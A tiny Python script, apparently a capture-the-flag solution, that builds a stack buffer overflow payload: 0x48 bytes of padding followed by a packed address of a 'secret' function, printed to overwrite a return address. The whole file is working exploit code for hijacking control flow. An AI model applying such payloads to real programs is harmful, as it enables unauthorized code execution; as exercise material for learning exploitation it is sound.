#!/usr/bin/env python

import struct

def p32(num):
	return struct.pack("<I", num)

offset = 0x48
secret_func_address = 0x080484bb

payload = offset * "A"  + p32(secret_func_address)
print(payload)
